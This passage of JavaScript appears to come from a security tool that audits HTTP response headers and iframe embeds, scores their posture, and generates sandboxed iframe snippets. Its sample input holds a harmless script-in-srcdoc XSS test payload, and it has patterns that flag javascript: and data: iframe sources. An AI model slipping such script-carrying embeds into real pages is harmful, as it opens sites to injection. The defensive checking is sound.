    if(!/includesubdomains/i.test(hsts))add('info','HSTS missing includeSubDomains','Add includeSubDomains once every subdomain is HTTPS-ready.',2);
    if(!/preload/i.test(hsts))add('info','HSTS preload not enabled','Consider preload after validating the domain is eligible.',1);
  }else add('crit','Missing Strict-Transport-Security','HTTPS sites should send HSTS to prevent protocol downgrade and SSL stripping.',15);

  const csp=getHeader(h,'content-security-policy');
  if(csp){
    miniAdd('CSP','Present');
    if(!/default-src/i.test(csp))add('warn','CSP missing default-src','Add a restrictive default-src as the baseline directive.',5);
    if(/unsafe-inline/i.test(csp))add('warn','CSP allows unsafe-inline','unsafe-inline weakens script/style injection protection. Prefer nonces or hashes.',7);
    if(!/object-src/i.test(csp))add('info','CSP missing object-src',"Set object-src 'none' unless legacy plugin content is required.",2);
  }else add('crit','Missing Content-Security-Policy','CSP is one of the highest-value browser-side injection controls.',18);

  const xfo=getHeader(h,'x-frame-options');
  const frameAncestors=(csp.match(/frame-ancestors\s+([^;]+)/i)||[])[1]||'';
  if(xfo||frameAncestors)miniAdd('Framing',frameAncestors?`CSP ${frameAncestors}`:xfo);
  else add('crit','Missing anti-framing policy','Add CSP frame-ancestors or X-Frame-Options to reduce clickjacking exposure.',12);

  if(headerHas(h,'x-content-type-options','nosniff'))miniAdd('MIME sniffing','nosniff');
  else add('warn','Missing X-Content-Type-Options','Set X-Content-Type-Options: nosniff to reduce MIME confusion attacks.',7);

  const ref=getHeader(h,'referrer-policy');
  if(ref)miniAdd('Referrer-Policy',ref);
  else add('warn','Missing Referrer-Policy','Use no-referrer or strict-origin-when-cross-origin to control URL leakage.',5);

  const perm=getHeader(h,'permissions-policy');
  if(perm)miniAdd('Permissions-Policy','Present');
  else add('info','Missing Permissions-Policy','Disable unused browser features like camera, microphone, geolocation, and payment.',4);

  ['cross-origin-opener-policy','cross-origin-embedder-policy','cross-origin-resource-policy'].forEach(name=>{
    const val=getHeader(h,name);
    if(val)miniAdd(name.replace(/cross-origin-/,'CO-').toUpperCase(),val);
    else add('info',`${name} not set`,'Consider cross-origin isolation headers for sensitive apps and advanced browser isolation.',1);
  });

  const acao=getHeader(h,'access-control-allow-origin');
  const acac=getHeader(h,'access-control-allow-credentials');
  if(acao==='*'&&/true/i.test(acac))add('crit','Dangerous CORS combination','ACAO * with credentials is invalid and often signals a broken CORS model.',12);
  else if(acao==='*')add('warn','CORS allows any origin','Wildcard CORS may be fine for public APIs but is risky for authenticated surfaces.',5);
  else if(acao)miniAdd('CORS origin',acao);

  if(getHeader(h,'server'))add('info','Server header leaks stack detail',`Server: ${getHeader(h,'server')}`,2);
  if(getHeader(h,'x-powered-by'))add('warn','X-Powered-By leaks framework detail',`X-Powered-By: ${getHeader(h,'x-powered-by')}`,4);

  const cache=getHeader(h,'cache-control');
  if(cache)miniAdd('Cache-Control',cache);
  else add('info','Missing Cache-Control','Sensitive authenticated pages should usually set no-store or private caching rules.',2);

  const cookies=getAllHeaders(h,'set-cookie');
  cookies.forEach((cookie,i)=>{
    const lower=cookie.toLowerCase();
    if(!lower.includes('secure'))add('crit',`Set-Cookie #${i+1} missing Secure`,cookie,8);
    if(!lower.includes('httponly'))add('warn',`Set-Cookie #${i+1} missing HttpOnly`,cookie,6);
    if(!lower.includes('samesite'))add('warn',`Set-Cookie #${i+1} missing SameSite`,cookie,4);
  });
  if(cookies.length)miniAdd('Set-Cookie',`${cookies.length} header(s)`);

  score=Math.max(0,Math.min(100,Math.round(score)));
  if(!parsed.entries.length){
    score=0;
    add('info','No headers parsed','Paste raw response headers or use the sample to start.',0);
  }
  if(!findings.some(f=>f.kind==='crit'||f.kind==='warn'))add('ok','Strong baseline detected','No high or medium-risk header gaps were detected.',0);
  renderHeaderResults({score,findings,mini,parsed});
}

function renderHeaderResults(report){
  lastHeaderReport=[
    'ReconKit Pro - HTTP Header Report',
    `Score: ${report.score}/100`,
    '',
    ...report.findings.map(f=>`[${f.kind.toUpperCase()}] ${f.title}: ${f.msg}`)
  ].join('\n');
  document.getElementById('hdr-score-stat').textContent=report.score;
  document.getElementById('hdr-pass-stat').textContent=report.findings.filter(f=>f.kind==='ok').length+report.mini.length;
  document.getElementById('hdr-risk-stat').textContent=report.findings.filter(f=>f.kind==='crit'||f.kind==='warn').length;
  const ring=document.getElementById('headerScoreRing');
  ring.style.setProperty('--score',report.score);
  ring.querySelector('b').textContent=report.score;
  document.querySelector('#headerScorePanel .deck-title').textContent=report.score>=85?'Strong header posture':report.score>=65?'Good, with hardening gaps':report.score>=40?'Risky header posture':'Critical header gaps';
  document.getElementById('headerNormalized').textContent=report.parsed.entries.length
    ?report.parsed.entries.map(e=>`${e.name}: ${e.value}`).join('\n')
    :'No headers parsed.';
  document.getElementById('headerMiniGrid').innerHTML=report.mini.map(m=>`
    <div class="mini-check"><div class="k">${escHtml(m.k)}</div><div class="v">${escHtml(m.v)}</div></div>
  `).join('')||'<div class="mini-check"><div class="k">Status</div><div class="v">No passing checks yet</div></div>';
  document.getElementById('headerFindings').innerHTML=report.findings.map(f=>`
    <div class="finding ${f.kind}"><strong>${escHtml(f.title)}</strong>${escHtml(f.msg)}</div>
  `).join('');
}

async function tryFetchHeaders(){
  const url=document.getElementById('headerUrl').value.trim();
  if(!url){document.getElementById('headerFindings').innerHTML='<div class="finding warn"><strong>URL required</strong>Enter a URL or use paste mode.</div>';return;}
  try{
    const res=await fetch(url,{method:'HEAD',mode:'cors',cache:'no-store'});
    const lines=[`HTTP ${res.status} ${res.statusText}`];
    res.headers.forEach((v,k)=>lines.push(`${k}: ${v}`));
    document.getElementById('headerInput').value=lines.join('\n');
    analyzeHeaders();
  }catch(e){
    document.getElementById('headerFindings').innerHTML=`<div class="finding warn"><strong>Fetch blocked</strong>${escHtml(e.message)}. Browser CORS often blocks security header reads; paste response headers for a complete result.</div>`;
  }
}
function loadSampleHeaders(){
  document.getElementById('headerInput').value=[
    'HTTP/2 200',
    "content-security-policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'",
    'strict-transport-security: max-age=31536000; includeSubDomains; preload',
    'x-frame-options: DENY',
    'x-content-type-options: nosniff',
    'referrer-policy: no-referrer',
    'permissions-policy: camera=(), microphone=(), geolocation=(), payment=()',
    'cross-origin-opener-policy: same-origin',
    'cross-origin-resource-policy: same-origin',
    'cache-control: no-store',
    'set-cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/'
  ].join('\n');
  analyzeHeaders();
}
function clearHeaderChecker(){
  document.getElementById('headerInput').value='';
  document.getElementById('headerUrl').value='';
  lastHeaderReport='';
  renderHeaderResults({score:0,findings:[{kind:'info',title:'No analysis yet',msg:'Paste headers and run the checker.'}],mini:[],parsed:{entries:[]}});
}
function copyHeaderReport(){
  if(!lastHeaderReport)analyzeHeaders();
  copyText(lastHeaderReport||'No header report generated.');
}

// IFRAME CHECKER
let iframeInited=false;
function initIframeChecker(){iframeInited=true;}

function analyzeIframes(){
  const raw=document.getElementById('iframeInput').value||'';
  const headerRaw=document.getElementById('iframeHeaderInput').value||'';
  const doc=new DOMParser().parseFromString('<body>'+raw+'</body>','text/html');
  const iframes=[...doc.querySelectorAll('iframe')];
  const parsedHeaders=parseRawHeaders(headerRaw).headers;
  const findings=[];
  const mini=[];
  let score=100;
  const add=(kind,title,msg,penalty=0)=>{findings.push({kind,title,msg});score-=penalty;};
  const miniAdd=(k,v)=>mini.push({k,v});

  const csp=getHeader(parsedHeaders,'content-security-policy');
  const xfo=getHeader(parsedHeaders,'x-frame-options');
  const frameAnc=(csp.match(/frame-ancestors\s+([^;]+)/i)||[])[1]||'';
  let framePolicy='Unknown';
  if(frameAnc){framePolicy=frameAnc;miniAdd('frame-ancestors',frameAnc);}
  else if(xfo){framePolicy=xfo;miniAdd('X-Frame-Options',xfo);}
  else if(headerRaw.trim())add('warn','Parent page has no anti-framing header','Add CSP frame-ancestors or X-Frame-Options on pages that should not be embedded.',12);

  if(!iframes.length){
    score=0;
    add('info','No iframe tags found','Paste one or more iframe tags, or a full HTML page containing iframes.',0);
  }

  iframes.forEach((ifr,idx)=>{
    const n=idx+1;
    const src=(ifr.getAttribute('src')||'').trim();
    const sandbox=ifr.getAttribute('sandbox');
    const allow=(ifr.getAttribute('allow')||'').toLowerCase();
    const ref=ifr.getAttribute('referrerpolicy');
    const title=ifr.getAttribute('title');
    const loading=ifr.getAttribute('loading');

    miniAdd(`Iframe #${n}`,src||'inline / empty src');
    if(sandbox===null)add('crit',`Iframe #${n} has no sandbox`,'Add a sandbox attribute and grant only the capabilities this embed needs.',18);
    else{
      miniAdd(`Iframe #${n} sandbox`,sandbox||'strict sandbox');
      const sx=sandbox.toLowerCase();
      if(sx.includes('allow-scripts')&&sx.includes('allow-same-origin'))add('warn',`Iframe #${n} sandbox can be escaped if content is same-origin`,'allow-scripts plus allow-same-origin should be used only for fully trusted content.',10);
    }
    if(!src)add('info',`Iframe #${n} has no src`,'Empty iframe src values can create confusing behavior. Use about:blank intentionally or set a trusted URL.',3);
    if(/^javascript:/i.test(src))add('crit',`Iframe #${n} uses javascript: src`,'Never embed javascript: URLs in iframe src.',25);
    if(/^data:/i.test(src))add('warn',`Iframe #${n} uses data: src`,'data: iframes can hide inline content and are hard to govern with allowlists.',10);
    if(ifr.hasAttribute('srcdoc'))add('warn',`Iframe #${n} uses srcdoc`,'srcdoc embeds inline HTML; make sure content is trusted and sandboxed.',8);
    ['camera','microphone','geolocation','payment','clipboard-write','fullscreen'].forEach(cap=>{
      if(allow.includes(cap))add(cap==='fullscreen'?'info':'warn',`Iframe #${n} grants ${cap}`,`Review whether ${cap} is required for this embed.`,cap==='fullscreen'?1:4);
    });
    if(!ref)add('warn',`Iframe #${n} missing referrerpolicy`,'Use no-referrer or strict-origin-when-cross-origin to limit URL leakage.',5);
    if(!title)add('info',`Iframe #${n} missing title`,'Add a descriptive title for accessibility and auditing.',3);
    if(loading!=='lazy')add('info',`Iframe #${n} missing loading="lazy"`,'Lazy loading reduces third-party load and tracking surface on initial page load.',2);
  });

  if(iframes.length&&!findings.some(f=>f.kind==='crit'||f.kind==='warn'))add('ok','Iframe posture looks strong','No high or medium-risk iframe issues were detected.',0);
  score=Math.max(0,Math.min(100,Math.round(score)));
  renderIframeResults({score,findings,mini,count:iframes.length,framePolicy});
}

function renderIframeResults(report){
  document.getElementById('if-count-stat').textContent=report.count;
  document.getElementById('if-score-stat').textContent=report.score;
  document.getElementById('if-frame-stat').textContent=report.framePolicy==='Unknown'?'?':'SET';
  const ring=document.getElementById('iframeScoreRing');
  ring.style.setProperty('--score',report.score);
  ring.querySelector('b').textContent=report.score;
  document.querySelector('#tab-iframe .score-panel .deck-title').textContent=report.score>=85?'Strong iframe posture':report.score>=65?'Good, with embed gaps':report.score>=40?'Risky iframe posture':'Critical iframe risks';
  document.getElementById('iframeMiniGrid').innerHTML=report.mini.map(m=>`
    <div class="mini-check"><div class="k">${escHtml(m.k)}</div><div class="v">${escHtml(m.v)}</div></div>
  `).join('')||'<div class="mini-check"><div class="k">Status</div><div class="v">No iframe data yet</div></div>';
  document.getElementById('iframeFindings').innerHTML=report.findings.map(f=>`
    <div class="finding ${f.kind}"><strong>${escHtml(f.title)}</strong>${escHtml(f.msg)}</div>
  `).join('');
}

function buildSafeIframe(){
  const src=document.getElementById('safeIframeSrc').value.trim()||'about:blank';
  const title=document.getElementById('safeIframeTitle').value.trim()||'Embedded content';
  const sandbox=document.getElementById('safeIframeSandbox').value;
  const sandboxAttr=sandbox?`sandbox="${escHtml(sandbox)}"`:'sandbox';
  const snippet=`<iframe
  src="${escHtml(src)}"
  title="${escHtml(title)}"
  ${sandboxAttr}
  referrerpolicy="no-referrer"
  loading="lazy"
  width="100%"
  height="360"
></iframe>`;
  document.getElementById('safeIframeSnippet').textContent=snippet;
  return snippet;
}
function previewSafeIframe(){
  const snippet=buildSafeIframe();
  document.getElementById('iframePreview').innerHTML=snippet;
}
function loadSampleIframe(){
  document.getElementById('iframeInput').value=[
    '<iframe src="https://example.com/widget" title="Example widget" loading="lazy" referrerpolicy="no-referrer" sandbox="allow-scripts"></iframe>',
    '<iframe srcdoc="<script>alert(1)<\\/script>" allow="camera; microphone"></iframe>'
  ].join('\n');
  document.getElementById('iframeHeaderInput').value="content-security-policy: default-src 'self'; frame-ancestors 'none'\nx-frame-options: DENY";
  document.getElementById('safeIframeSrc').value='https://example.com/widget';
  analyzeIframes();
  buildSafeIframe();
}
function clearIframeChecker(){
  document.getElementById('iframeInput').value='';
  document.getElementById('iframeHeaderInput').value='';
  document.getElementById('safeIframeSnippet').textContent='Configure a safe iframe snippet above.';
  document.getElementById('iframePreview').innerHTML='<span style="color:var(--text-dim);font-size:11px;">Build a snippet, then preview it here.</span>';
  renderIframeResults({score:0,findings:[{kind:'info',title:'No analysis yet',msg:'Paste iframe HTML and run the checker.'}],mini:[],count:0,framePolicy:'Unknown'});
}

function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function escQ(s){return s.replace(/'/g,'\\x27').replace(/"/g,'\\x22');}

// Init theme + Google Dorks on load
setTheme(localStorage.getItem('rk.theme')||'hacker',document.querySelector(`.theme-btn[data-theme="${localStorage.getItem('rk.theme')||'hacker'}"]`));
renderGoogleDorks();
